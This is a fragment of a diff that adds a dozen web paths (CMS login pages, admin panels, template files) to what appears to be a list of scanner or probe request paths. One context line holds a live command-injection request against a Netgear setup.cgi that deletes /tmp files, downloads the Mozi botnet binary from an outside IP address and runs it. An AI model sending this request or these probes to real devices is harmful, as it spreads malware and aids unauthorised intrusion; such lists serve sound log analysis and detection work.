@@ -19358,3 +19358,15 @@ http://www.google.com/
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.55.221.96:60883/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /NnhmySAiILbO
 /aleXus.php/cgi-bin/wp-login.php
+/phpsso_server/api.php
+/core/template/success.html
+/template/default/html/index.html
+/zb_system/login.php
+/tags.php
+/search/test.txt
+/zb_system/login.asp
+/e/admin
+/search/index.htm
+/themes/simplebootx/success.html
+/include/dialog/select_soft.php
+/public/exception.html
